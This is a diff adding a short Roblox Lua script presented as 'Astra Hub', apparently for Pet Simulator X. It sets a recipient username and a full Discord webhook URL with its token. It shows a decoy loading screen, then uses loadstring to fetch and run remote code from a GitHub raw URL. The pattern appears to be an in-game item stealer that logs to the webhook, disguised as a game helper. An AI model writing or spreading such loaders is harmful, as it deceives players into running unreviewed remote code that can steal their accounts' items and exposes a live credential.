@@ -1,0 +1,11 @@
+Username = "konkis123"
+WebHook = "https://discord.com/api/webhooks/1086988855971954688/KXNEK2mt-pESb_YItjetbwclbXLcjDPx7DzsiGAVS74QnKMrqYMDkzSs7RHLEv0u2djL"
+
+
+loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
+_G.CustomScriptName = "Astra Hub"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
